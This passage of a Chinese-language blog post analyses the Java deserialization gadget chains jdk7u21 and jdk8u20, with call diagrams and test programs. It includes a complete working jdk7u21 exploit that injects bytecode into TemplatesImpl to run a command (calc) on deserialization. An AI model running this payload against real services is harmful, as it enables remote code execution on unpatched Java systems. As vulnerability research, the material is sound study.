<p>可见这个字符串的 <code>hashCode</code> 值是为 <code>0</code> 了。</p>
<p>第二种 <code>0</code> 字节字符是最简单的了，注意观察 <code>h = 31*h + val[off++]</code> 式子，其中 <code>h</code> 来自 <code>hash</code> 属性的值，而 <code>hash</code> 属性的默认值为 <code>0</code> ，只需构造一个任意长度的 <code>0</code> 字节即可让最后返回值为 <code>0</code> ，比如👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171242246.png" alt="image-20220217124235175"> </p>
<p>非常的简单。</p>
<p>之后就是将 <code>TemplatesImpl</code> 类的 <code>payload</code> 放到上述任一经过 <code>hashCode</code> 返回值为 <code>0</code> 的字符串键名对应的值就好了。另外，必须让 <code>HashSet.put([TemplatesImpl类()])</code> 先被 <code>writeObject</code> ，这样才能够用使 <code>TemplatesImpl</code> 的 <code>payload</code> 作为参数去调用 <code>AnnotationInvocationHand</code> 代理的 <code>equals</code> 方法。</p>
<h3 id="payload-9"><a href="#payload-9" class="headerlink" title="- payload -"></a>- payload -</h3><p>关键点在于如何让 <code>HashSet.put([TemplatesImpl类()])</code> 先被 <code>writeObject</code> ，比如可以改一下 <code>AnnotationInvocationHand</code> 中 <code>memberValues</code> 属性的值👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdk7u21</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        CtClass[] cs = <span class="keyword">new</span> CtClass[]&#123;</span><br><span class="line">                pool.makeClass(<span class="string">&quot;a&quot;</span> + System.nanoTime()),</span><br><span class="line">                pool.makeClass(<span class="string">&quot;b&quot;</span> + System.nanoTime())</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        cs[<span class="number">0</span>].makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] bc = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                cs[<span class="number">0</span>].toBytecode(),</span><br><span class="line">                cs[<span class="number">1</span>].toBytecode()</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化templates并通过反射赋值</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bc);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;dqv5&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Class aih = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor aihC = aih.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihC.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造TemplatesImpl</span></span><br><span class="line">        TemplatesImpl ti = getTemplatesImpl(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造key</span></span><br><span class="line">        String key = <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="number">0</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造AnnotationInvocationHandler代理</span></span><br><span class="line">        HashMap hm = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hm.put(key,ti.hashCode());</span><br><span class="line"></span><br><span class="line">        InvocationHandler aihC1 = (InvocationHandler) aihC.newInstance(Templates.class, hm);</span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(aih.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, aihC1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造HashSet</span></span><br><span class="line">        HashSet hs = <span class="keyword">new</span> HashSet();</span><br><span class="line">        hs.add(proxy);</span><br><span class="line">        hs.add(ti);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 避免本地执行</span></span><br><span class="line">        hm.put(key,ti);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化测试</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(hs);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171313724.png" alt="image-20220217131300533"></p>
<p>是成功了。</p>
<h2 id="jdk8u20"><a href="#jdk8u20" class="headerlink" title="- jdk8u20 -"></a>- jdk8u20 -</h2><p>在原 <code>jdk8u20</code> 链的基础上稍作了一些修改，研究这个 <code>jdk8u20</code> 链的师傅们tql。</p>
<p>实验环境：</p>
<ul>
<li><code>jdk1.8.0_20</code></li>
</ul>
<h3 id="调用结构-8"><a href="#调用结构-8" class="headerlink" title="- 调用结构 -"></a>- 调用结构 -</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">BeanContextSupport.readObject()</span><br><span class="line">	👇</span><br><span class="line">	BeanContextSupport.readChildren()</span><br><span class="line">	👇</span><br><span class="line">	(Map)Proxy.readObject() &lt;=&gt; AnnotationInvocationHandler.readObject()</span><br><span class="line">	👇</span><br><span class="line">	HashSet.readObject()</span><br><span class="line">    	👇</span><br><span class="line">		HashMap.put()</span><br><span class="line">		👇</span><br><span class="line">		(Map)Proxy.equals()</span><br><span class="line">		👇</span><br><span class="line">		(Map)Proxy.invoke() &lt;=&gt; AnnotationInvocationHandler.invoke()</span><br><span class="line">    	👇</span><br><span class="line">    	AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">    		👇</span><br><span class="line">			TemplatesImpl.newTransformer()</span><br><span class="line">        	👇</span><br><span class="line">        	TemplatesImpl.getTransletInstance()</span><br><span class="line">        	👇</span><br><span class="line">        	TemplatesImpl.defineTransletClasses()</span><br><span class="line">        	👇</span><br><span class="line">        	newInstance()</span><br></pre></td></tr></table></figure>
<h3 id="分析-10"><a href="#分析-10" class="headerlink" title="- 分析 -"></a>- 分析 -</h3><p>其实 <code>jdk8u20</code> 链的后半段就是 <code>jdk7u21</code> 链了，之所以多出了半段是因为在 <code>AnnotationInvocationHandler</code> 的 <code>readObject</code> 方法中多了一个对 <code>AnnotationInvocationHandler</code> 的 <code>type</code> 属性类型的判断👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171329662.png" alt="image-20220217132952568"></p>
<p>显然如果使用 <code>jdk7u21</code> 的 <code>payload</code> 在这一段会 <code>throw</code> 出错误，那么如何规避这个错误呢，比方说可以用镶嵌的 <code>try</code> 👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestTry</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;START&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(<span class="number">1</span> / <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;THROW&quot;</span>);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">&quot;throw&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;END&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行该代码将得到结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171334400.png" alt="image-20220217133426287"></p>
<p>可见最后是能过到达 <code>END</code> 输出的，这是因为第二个 <code>try</code> 将第一个 <code>try</code> 中 <code>throw</code> 出的错误给 <code>catch</code> 了，同时没有任何作为，那么在途中就不会报错了。</p>
<p>如果跟进 <code>BeanContextSupport</code> 类的 <code>readChildren</code> 方法，就可以看到类似镶嵌 <code>try</code> 的结构，并且在第二个 <code>try</code> 中有关于 <code>readObject</code> 方法的调用👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171338996.png" alt="image-20220217133854893"></p>
<p>而这个 <code>readChildren</code> 方法可以由 <code>BeanContextSupport</code> 类的 <code>readObject</code> 到达👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171338960.png" alt="image-20220217133818887"></p>
<p>那么该如何利用 <code>BeanContextSupport</code> 类的 <code>readChildren</code> 方法中 <code>try</code> 里的循环 <code>readObject</code> 呢，这就涉及到了关于 <code>反序列化</code> 时的问题。</p>
<p>简单来说为当 <code>A</code> 类进行反序列化时如果有 <code>readObject</code> 多个 <code>B</code> 类的内容，则只会对 <code>B</code> 类 <code>反序列化</code> 一次(仅调用一次 <code>B</code> 类的 <code>readObject</code> 方法)，此后在 <code>A</code> 类中如果进行有关 <code>B</code> 类的调用就会使用第一次  <code>B</code> 类 <code>反序列化</code> 得到的 <code>B</code> 类实例。</p>
<p>比方说以下代码👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String s;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream i)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        i.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;THROW&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> B b;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream o)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        o.defaultWriteObject();</span><br><span class="line">        o.writeObject(b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream i)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            i.defaultReadObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">        System.out.println(((B)i.readObject()).s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        b.s = <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        A a = <span class="keyword">new</span> A();</span><br><span class="line">        a.b = b;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(a);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171402818.png" alt="image-20220217140240635"></p>
<p>可见虽然 <code>B</code> 类在 <code>A</code> 类的 <code>defaultReadObject</code> 中有 <code>throw</code> 出错误，但 <code>B</code> 类 <code>反序列化</code> 得到的实例还是在的，从而在 <code>System.out.println(((B)i.readObject()).s)</code> 二次调用同一个 <code>B</code> 类实例时并没有再次调用 <code>B</code>类的 <code>readObject</code> 方法。当然，前提是 <code>B</code> 类在其 <code>readObject</code> 方法中 <code>throw</code> 出错误前，得先 <code>defaultReadObject</code> 读取序列化数据。</p>
<p>但如果是在 <code>readObject</code> 中 <code>throw</code> 出了错误，则下一段的 <code>readObject</code> 则会 <code>throw</code> 出 <code>IOException</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171427926.png" alt="image-20220217142712729"></p>
<p>那么如何规避这类错误呢，经过调试，当调用到 <code>Object c = i.readObject()</code> 时，错误来自 <code>ObjectInputStream</code> 类的 <code>readObject0</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171454240.png" alt="image-20220217145402093"></p>
<p>此时 <code>defaultDataEnd</code> 属性的值为 <code>true</code> ，也就会执行到了 <code>throw new OptionalDataException(true)</code> ，因此现在的目标是如何让 <code>defaultDataEnd</code> 属性一直为 <code>false</code> 。</p>
<p>先来看 <code>defaultDataEnd</code> 属性的默认值👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171508762.png" alt="image-20220217150819709"></p>
<p>是为 <code>false</code> 的，也就是说一定在某个时刻将其赋值成了 <code>true</code> ，全局搜索将 <code>defaultDataEnd</code> 设为 <code>true</code> 的方法，可以发现在 <code>defaultReadObject</code> 方法中如果调用该方法的类不存在 <code>writeObject</code> 方法，则会将 <code>defaultDataEnd</code> 属性设为 <code>true</code>👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171515939.png" alt="image-20220217151527839"></p>
<p>也就是说每次在 <code>readObject</code> 方法里如果有对 <code>defaultReadObject</code> 方法的调用，<code>defaultDataEnd</code> 属性就会被设为 <code>true</code>。</p>
<p>接着对整个 <code>反序列化</code> 过程进行调试，在 <code>ObjectInputStream</code> 类的 <code>readSerialData</code> 方法中有对相应类 <code>readObject</code> 方法的调用👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171512376.png" alt="image-20220217151232227"></p>
<p>而如果成功调用了 <code>readObject</code> 方法，即在没有报错的情况下会将 <code>defaultDataEnd</code> 设为 <code>false</code> ，那么只要保证如果进行 <code>反序列化</code> 会报错的类拥有 <code>writeObject</code> 方法就可以规避让 <code>defaultDataEnd</code> 为 <code>true</code> 的情况了。</p>
<p>但仅仅是让进行 <code>反序列化</code> 会报错的类直接加上 <code>writeObject</code> 方法依然是不可行的，因为从 <code>slotDesc.invokeReadObject(obj, this)</code> 这段代码可以看出，如果将 <code>A</code> 类和 <code>B</code> 类镶嵌序列化，在进行 <code>反序列化</code> 时所解析的内容是共用的。那么假设在 <code>A</code> 类的 <code>readObject</code> 方法里，对 <code>B</code> 类进行 <code>readObject</code> 时报错，但用 <code>try</code> 忽略了错误，而 <code>B</code> 类又有 <code>writeObject</code> 方法且有 <code>writeObject</code> 操作，那么在 <code>A</code> 类里的下一个 <code>readObject</code> 调用结果为 <code>B</code> 类从 <code>writeObject</code> 方法写入的内容👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CC</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String s = <span class="string">&quot;c&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BB</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String s = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream o)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        o.defaultWriteObject();</span><br><span class="line">        o.writeObject(<span class="keyword">new</span> CC());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream i)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        i.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;THROW&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AA</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String s = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream o)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        o.defaultWriteObject();</span><br><span class="line">        o.writeObject(<span class="keyword">new</span> BB());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream i)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        i.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 来自AA =&gt; writeObject(new BB())</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object o1 = i.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 来自BB =&gt; writeObject(new CC())</span></span><br><span class="line">        Object o2 = i.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            CC o22 = (CC) o2;</span><br><span class="line">            System.out.println(o22.s);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClass2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(<span class="keyword">new</span> AA());</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171546329.png" alt="image-20220217154603133"></p>
<p>可见在 <code>AA</code> 类中的第二个 <code>readObject</code> 拿到了 <code>BB</code> 类中 <code>writeObject</code> 的内容。</p>
<p>如果不在 <code>BB</code> 类的 <code>writeObject</code> 写入 <code>CC</code> 类，而是在 <code>AA</code> 类的 <code>writeObject</code> 中写入能否行得通呢，是不可以的👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171551233.png" alt="image-20220217155144037"></p>
<p>如果跟进报错，可以看到是读取到了 <code>TC_ENDBLOCKDATA</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171637631.png" alt="image-20220217163738462"></p>
<p>其实上述之所以拿到了 <code>BB</code> 类中 <code>writeObject</code> 的内容，是因为当 <code>BB</code> 类在调用自身的 <code>readObject</code> 方法时 <code>throw</code> 出错误且被 <code>try</code> 忽略了，此时 <code>反序列化</code> 读取的指针位置的下一部分是 <code>BB</code> 类的 <code>writeObject</code> 部分， <code>AA</code> 类再次调用 <code>readObject</code> 方法时，就会尝试读取 <code>BB</code> 类额外的 <code>writeObject</code> 部分，但此时 <code>BB</code> 类额外的 <code>writeObject</code> 部分为空(读到了 <code>TC_ENDBLOCKDATA</code> )，就报错了。</p>
<p>那么有没有办法让 <code>AA</code> 类在 <code>反序列化</code> 时即便 <code>BB</code> 类出错了，但又能拿到属于自己写入的 <code>writeObject</code> 内容呢，答案是有的。</p>
<p>不妨先来看重写 <code>writeObject</code> 和默认序列化的序列化内容👇</p>
